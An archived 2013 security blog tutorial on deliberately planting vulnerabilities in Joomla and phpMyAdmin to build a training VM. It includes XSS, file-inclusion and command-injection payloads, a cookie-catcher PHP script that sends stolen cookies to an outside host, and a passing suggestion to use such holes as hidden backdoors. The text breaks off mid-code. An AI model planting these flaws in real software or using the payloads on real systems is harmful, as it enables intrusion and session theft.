@@ -1,0 +1,633 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Inserting Vulnerabilities in Web Applications - Prateek Gianchandani</title>
+  <meta name="author" content="Prateek Gianchandani">
+
+  
+  <meta name="description" content="Inserting Vulnerabilities in Web Applications Jun 13th, 2013 Posted by Prateek Gianchandani In this article we will look at how we can insert &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://prateek147.github.io/2013/06/13/inserting-vulnerabilities-in-web-applications">
+  <link href="/favicon.png" rel="icon">
+  <link href='http://fonts.googleapis.com/css?family=Quicksand:300,400' rel='stylesheet' type='text/css'>
+  <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300' rel='stylesheet' type='text/css'>
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Prateek Gianchandani" type="application/atom+xml">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/bootstrap-collapse.js"></script>
+  <script src="/js/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.16/jquery-ui.min.js" type="text/javascript"></script>
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-41877509-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <div class="navbar navbar-inverse navbar-static-top">
+  	<div class="navbar-inner">
+  	  <div class="container">
+        <a class="btn btn-navbar" data-toggle="collapse" data-target=".navbar-responsive-collapse">
+          <span class="fui-menu-24"></span>
+        </a>
+  	  	<div class="nav-collapse collapse navbar-responsive-collapse" style="height:0;">
+  	      <ul class="nav">
+    
+        <li ><a href="/index.html">Home</a></li>
+    
+        <li ><a href="/security/">Security</a></li>
+    
+        <li ><a href="/ios/">iOS Development</a></li>
+    
+        <li ><a href="/everest/">Everest</a></li>
+    
+        <li ><a href="/archives/index.html">Archives</a></li>
+    
+        <li ><a href="http://damnvulnerableiosapp.com">DVIA</a></li>
+    
+        <li ><a href="/about/">About Me</a></li>
+    
+        <li ><a href="/hire-me/">Hire Me</a></li>
+    
+</ul>
+
+<ul class="nav pull-right">
+    
+    <li><a href="http://github.com/prateek147" title="Github Profile"><i class="icon-github-sign social-navbar"></i></a></li>
+    
+    
+    <li><a href="http://linkedin.com/in/prateekgianchandani" title="Linkedin Profile"><i class="icon-linkedin-sign social-navbar"></i></a></li>
+    
+    
+    <li><a href="http://twitter.com/prateekg147" title="Twitter Profile"><i class="icon-twitter-sign social-navbar"></i></a></li>
+    
+    
+    
+    <li><a href="http://facebook.com/prateek.gianchandani" title="Facebook Profile"><i class="icon-facebook-sign social-navbar"></i></a></li>
+    
+</ul>
+
+  	    </div>
+  	  </div>
+  	</div>
+  </div>
+  <div class="container" id="main">
+    <div class="span12">
+      <div class="row-fluid">
+        <div id="content">
+          <div>
+<article class="hentry" role="article">
+  
+
+  <header>
+  <div class="jumbotron">
+    Inserting Vulnerabilities in Web Applications
+	<h5>
+
+
+
+
+
+
+
+
+  
+
+
+<i class="icon-calendar-empty"></i> <time datetime="2013-06-13T20:43:00+04:00" pubdate data-updated="true">Jun 13<span>th</span>, 2013</time></h5>
+  <h4>
+  
+
+<p>Posted by <a href="http://highaltitudehacks.com/about/">Prateek Gianchandani</a></p>
+<h4>
+  </div>
+</header>
+  <div class="row-fluid">
+    <div class="span12">
+      <p><p> In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.<p></p>
+
+<p><!-- more --></p>
+
+<p><p>In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.<p></p>
+
+<p><p>The first and foremost thing to do is to change some of the configurations in the <i>php.ini</i> file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location <i>/etc/php.ini</i>. In your case it might be different. Instead of changing the configuration of your main <i>php.ini</i> file, you can instead make a custom <i>php.ini</i> file in your web application which could overwrite the settings in the main <i>php.ini</i> file, though this may not work all the time. Hence we will go with editing the main <i>php.ini</i> file. Open up your <i>php.ini</i> file and make sure the following settings match with your php.ini file.<p></p>
+
+<p><pre>safe_mode = Off</pre></p>
+
+<p><p>The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to <a href="http://php.net">php.net</a>, this feature has been DEPRECATED as of PHP 5.3.0. <p></p>
+
+<p><pre>register_globals = On</pre></p>
+
+<p><p>This setting allows the modification of global variables from the URL. For e.g if the url is <i><a href="http://infosecinstitute.com?q=infosec">http://infosecinstitute.com?q=infosec</a></i> then this means that the value of &ldquo;q&rdquo; can be changed depending upon the URL (in this case it is &ldquo;infosec&rdquo;). In case of a different url say <i><a href="http://infosecinstitute.com?q=test">http://infosecinstitute.com?q=test</a></i>, the value of q will be &ldquo;test&rdquo;. Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.<p></p>
+
+<p><pre>allow_url_fopen = On</pre></p>
+
+<p><p>This options allows the treatment of URL&rsquo;s as files.<p></p>
+
+<p><pre>allow_url_include = On</pre></p>
+
+<p><p>This option uses the function include, include_once, require, require_once to open URL&rsquo;s as files.<p></p>
+
+<p><pre>magic_quotes_gpc = Off</pre></p>
+
+<p><p>This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.<p></p>
+
+<p><pre>file_uploads = On</pre></p>
+
+<p><p>This allows the use of HTTP file uploads<p></p>
+
+<p><pre>display_errors = On</pre></p>
+
+<p><p>This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.<p></p>
+
+<p><p>Once you have made these changes, save the <i>php.ini</i> file (make sure that it is writable). Restart the server to make the changes come into effect.<p></p>
+
+<p><img src="/images/posts/insvul/first.png" width="572" height="96" alt="First"></p>
+
+<p><p>The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from <a href="http://www.joomla.org/download.html">here.</a> Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.<p></p>
+
+<p><img src="/images/posts/insvul/1.png" width="1052" height="731" alt="1"></p>
+
+<p><p>Let&rsquo;s go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let&rsquo;s see what are the configurations in it. Open up the .htaccess file .<p></p>
+
+<p><img src="/images/posts/insvul/2.png" width="713" height="452" alt="2"></p>
+
+<p><p>As we can see that their is a lot of interesting stuff here. Let&rsquo;s analyze them one by one.<p></p>
+
+<p><img src="/images/posts/insvul/3.png" width="680" height="35" alt="3"></p>
+
+<p><p>This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.<p></p>
+
+<p><img src="/images/posts/insvul/4.png" width="680" height="35" alt="3"></p>
+
+<p><p>Protection against Cross Site Scripting.<p></p>
+
+<p><img src="/images/posts/insvul/5.png" width="711" height="39" alt="5"></p>
+
+<p><p>Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion<p></p>
+
+<p><img src="/images/posts/insvul/6.png" width="629" height="41" alt="6"></p>
+
+<p><p>Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request. <p></p>
+
+<p><img src="/images/posts/insvul/7.png" width="713" height="43" alt="7"></p>
+
+<p><p>In case the user tries to browse somewhere he doesn&rsquo;t have access to.</p></p>
+
+<p><p>Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.<p></p>
+
+<p><img src="/images/posts/insvul/8.png" width="713" height="452" alt="8"></p>
+
+<p><p><b>1) Inserting Reflected XSS (Cross Site Scripting)</b></p></p>
+
+<p><p>Let&rsquo;s say we add the following code to index.php file in Joomla<p></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">$name = $_GET[&#39;name&#39;];</span>
+</span><span class='line'><span class="x">   if(isset($name))</span>
+</span><span class='line'><span class="x">   {</span>
+</span><span class='line'><span class="x">       print &quot;Welcome, &quot;.$name;</span>
+</span><span class='line'><span class="x">   }</span>
+</span><span class='line'><span class="x">   else</span>
+</span><span class='line'><span class="x">   {</span>
+</span><span class='line'><span class="x">       print &quot;Welcome, User &quot;;</span>
+</span><span class='line'><span class="x">   }</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><p>The Joomla main page takes a name parameter in it&rsquo;s url and displays a welcome message at the top of the main page as shown in the figure below.</p></p>
+
+<p><img src="/images/posts/insvul/9.png" width="1000" height="405" alt="9"></p>
+
+<p><p>We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the <i>script</i> tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.</p></p>
+
+<p><p>Let&rsquo;s enter the following url in the input</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E">http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E</a></pre></p>
+
+<p><img src="/images/posts/insvul/10.png" width="1000" height="503" alt="10"></p>
+
+<p><p>The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.</p></p>
+
+<p><b>2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)</b></p>
+
+<p><p>Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.</p></p>
+
+<p><p>Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be <i>com_infosec</i>. </p></p>
+
+<p><img src="/images/posts/insvul/11.png" width="920" height="305" alt="11"></p>
+
+<p><p>Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it&rsquo;s infosec.php file.</p></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">if (isset($<em>REQUEST[&quot;imp_file&quot;])){ </span>
+</span><span class='line'><span class="x">    $imp_file = $</em>REQUEST[&quot;imp_file&quot;];</span>
+</span><span class='line'><span class="x">} </span>
+</span><span class='line'><span class="x">require_once($imp_file);</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><p>Note that we could have used the code <i>include_once</i> too. The only difference between them is that <i>include_once</i> will show an error in case the file is not found while <i>require_once</i> won&rsquo;t. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let&rsquo;s try and display the </i>/etc/passwd</i> file.</p></p>
+
+<p><p>Go to the following url:</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=../../../../../etc/passwd">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=../../../../../etc/passwd</a></pre></p>
+
+<p><img src="/images/posts/insvul/13.png" width="1709" height="903" alt="13"></p>
+
+<p><p>As we can see that we get a dump of the <i>/etc/passwd</i> file of the server. Note that the number of <i>&ldquo;../&rdquo;</i> might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let&rsquo;s try and load up google.com on the Joomla home page.</p></p>
+
+<p><p>Go to the following url:</p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com</a></pre></p>
+
+<p><img src="/images/posts/insvul/14.png" width="1000" height="892" alt="14"></p>
+
+<p><p>We just successfully loaded a remote url on Joomla&rsquo;s web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim. </p></p>
+
+<p><p>Please note that sometimes the code which is responsible for including the file could be like this</p></p>
+
+<p><pre>include($FilePath.&lsquo;.php&rsquo;);</pre></p>
+
+<p><p>This means that the argument is appended with &ldquo;.php&rdquo; and that file name is then included. In this case our previous url will not work because of the extra &ldquo;.php&rdquo; after it. However its effect can be nullified by adding the null byte <i>&ldquo;%00&rdquo;</i> after the url. This escapes all the stuff after the null byte.</p></p>
+
+<p><p>Hence in this case our url would be.. </p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com%00codeDoesntGoHere">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com%00codeDoesntGoHere</a></pre></p>
+
+<p><b>3) Inserting Information Disclosure vulnerability</b></p>
+
+<p><p>Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name <i>&ldquo;configurations.php&rdquo;</i> and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension <i>&ldquo;.bak&rdquo;</i>. Hence the backup file for the configuration file <i>&ldquo;configurations.php&rdquo;</i> would be named as &ldquo;configurations.php.bak&rdquo;. However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker&rsquo;s side, though it can also be done by the use of automated tools. The .bak file looks something like this.</p></p>
+
+<p><img src="/images/posts/insvul/config_file.png" width="1140" height="702" alt="Config File"></p>
+
+<p><p>As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.</p></p>
+
+<p><p>Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the <i>robots.txt</i> file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the <i>robots.txt</i> file. When we browse to the </i>robots.txt</i> file for Joomla we get something like this.</p></p>
+
+<p><img src="/images/posts/insvul/16.png" width="750" height="486" alt="16"></p>
+
+<p><p>We now know that the admin is protecting something from the web crawlers, a folder with a weird name <i>21lnkqasdsacnd1eqwdn22qwd2wd</i>. Let&rsquo;s check it out. </p>
+<img src="/images/posts/insvul/17.png" width="851" height="343" alt="17"></p>
+
+<p><p>The <i>password.txt</i> file is available for anyone to view. Some developers think that the <i>robots.txt</i> file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.</p></p>
+
+<p><b>4)Inserting CSRF (Cross Site Request Forgery) Vulnerability</b></p>
+
+<p><p>CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker&rsquo;s website which would be submitted to the trusted website on behalf of the victim.</p></p>
+
+<p><p>There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won&rsquo;t have access to the user&rsquo;s credentials and hence won&rsquo;t be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">here</a>.</p></p>
+
+<p><p>For inserting the next two vulnerabilities we are going to use the web application <i>phpMyAdmin</i>. More information on phpMyAdmin and to know the steps to install it, click <a href="http://www.phpmyadmin.net/documentation/">here</a>.</p></p>
+
+<p><b>5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities</b></p>
+
+<p><p>Let&rsquo;s assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html <i><a href="http://site-IP/phpmyadmin/message.html">http://site-IP/phpmyadmin/message.html</a></i> that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the <i>text.html</i> page. So if an attacker can inject malicious code in the message field then that code would execute on the admin&rsquo;s machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin&rsquo;s cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable <i>&lsquo;c&rsquo;</i>. We pass the variable <i>c</i> as document.cookie (i.e the user&rsquo;s cookie) to the <i>Cookie Catcher</i> file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is <i><a href="http://infosecinstitute.com/cookie_catcher.php">http://infosecinstitute.com/cookie_catcher.php</a></i> then the request that we will send from the client machine through XSS is <i><a href="http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE">http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE</a></i>. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named <i>user_info.html</i>.</p></p>
+
+<p><p class="code">Code for &ldquo;message.html&rdquo;, the message to the admin is sent from here</p></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">    &lt;html&gt;</span>
+</span><span class='line'><span class="x">    &lt;head&gt; POST YOUR MESSAGE TO ADMIN HERE ! &lt;/head&gt;</span>
+</span><span class='line'><span class="x">    &lt;body&gt;</span>
+</span><span class='line'><span class="x">    &lt;form action=&quot;message.php&quot; method=&quot;get&quot;&gt;</span>
+</span><span class='line'><span class="x">      &lt;input type=&quot;text&quot; name=&quot;c&quot; /&gt;</span>
+</span><span class='line'><span class="x">    &lt;/form&gt;</span>
+</span><span class='line'><span class="x">    &lt;/body&gt;</span>
+</span><span class='line'><span class="x">    &lt;/html&gt;   </span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><p class="code">Code for &ldquo;message.php&rdquo;, once the message is sent, this code stores the message in a file named text.html</p></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x"> </span><span class="cp">&lt;?php</span>
+</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span><span class='line'>    <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span> <span class="p">(</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nv">$date</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;j F, Y, g:i a&quot;</span><span class="p">);;</span>
+</span><span class='line'>    <span class="nv">$referer</span><span class="o">=</span><span class="nb">getenv</span> <span class="p">(</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;text.html&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">&#39;Message: &#39;</span><span class="o">.</span><span class="nv">$text</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt; IP: &#39;</span> <span class="o">.</span><span class="nv">$ip</span><span class="o">.</span> <span class="s1">&#39;&lt;br&gt; Date and Time: &#39;</span> <span class="o">.</span><span class="nv">$date</span><span class="o">.</span> <span class="s1">&#39;&lt;br&gt; Referer: &#39;</span><span class="o">.</span><span class="nv">$referer</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span><span class='line'>    <span class="c1">//Redirect the user to google.com</span>
+</span><span class='line'>    <span class="nx">header</span> <span class="p">(</span><span class="s2">&quot;Location: <a href="http://www.google.com&amp;quot;">http://www.google.com&amp;quot;</a></span><span class="p">);</span>
+</span><span class='line'> <span class="cp">?&gt;</span><span class="x">   </span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><p class="code">Code for &ldquo;Cookie Catcher file&rdquo;. Note that this file should be stored somewhere on the internet, we call the url of the file with an argument &ldquo;c&rdquo; in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named &ldquo;user_info.html&rdquo;. </p></p>
+
+<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">   </span><span class="cp">&lt;?php</span>
+</span><span class='line'>    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span><span class='line'>    <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span> <span class="p">(</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nv">$date</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;j F, Y, g:i a&quot;</span><span class="p">);;</span>
+</span><span class='line'>    <span class="nv">$referer</span><span class="o">=</span><span class="nb">getenv</span> <span class="p">(</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;user_info.html&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">&#39;Cookie: &#39;</span><span class="o">.</span><span class="nv">$cookie</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt; IP: &#39;</span> <span class="o">.</span><span class="nv">$ip</span><span class="o">.</span> <span class="s1">&#39;&lt;br&gt; Date and Time: &#39;</span> <span class="o">.</span><span class="nv">$date</span><span class="o">.</span> <span class="s1">&#39;&lt;br&gt; Referer: &#39;</span><span class="o">.</span><span class="nv">$referer</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span><span class='line'>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span><span class='line'>    <span class="c1">//Redirect the user to google.com</span>
+</span><span class='line'>    <span class="nx">header</span> <span class="p">(</span><span class="s2">&quot;Location: <a href="http://www.google.com&amp;quot;">http://www.google.com&amp;quot;</a></span><span class="p">);</span>
+</span><span class='line'>    <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><b>5) Inserting Remote Command Execution vulnerability</b></p>
+
+<p><p>Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this <i>&ldquo;127.0.0.1 ; ls&rdquo; OR &ldquo;127.0.0.1 ; cat /etc/passwd&rdquo;</i> he can run these commands on the remote webserver and see the output too.</p></p>
+
+<p><p>Here is how the footer appears in phpMyAdmin</p></p>
+
+<p><img src="/images/posts/insvul/phpRemoteExexVuln.png" width="1000" height="722" alt="PhpRemoteExexVuln"></p>
+
+<p><p>Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.</p></p>
+
+<p><img src="/images/posts/insvul/remoteExecResult.png" width="1000" height="416" alt="RemoteExecResult"></p>
+
+<p><p class="code">Here is the code for the file &ldquo;config.footer.inc.php&rdquo; </p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">   </span><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;h1&gt;Find which server is online anywhere in the world&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">      &lt;p&gt;Enter an IP address of the server below:&lt;/p&gt;</span>
+</span><span class='line'><span class="x">      &lt;form name=&quot;ping&quot; action=&quot;ping.php&quot; method=&quot;post&quot;&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot;&gt;</span>
+</span><span class='line'><span class="x">      &lt;/form&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><p class="code">Here is the code for the file &ldquo;ping.php&rdquo; </p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x"> </span><span class="cp">&lt;?php</span>
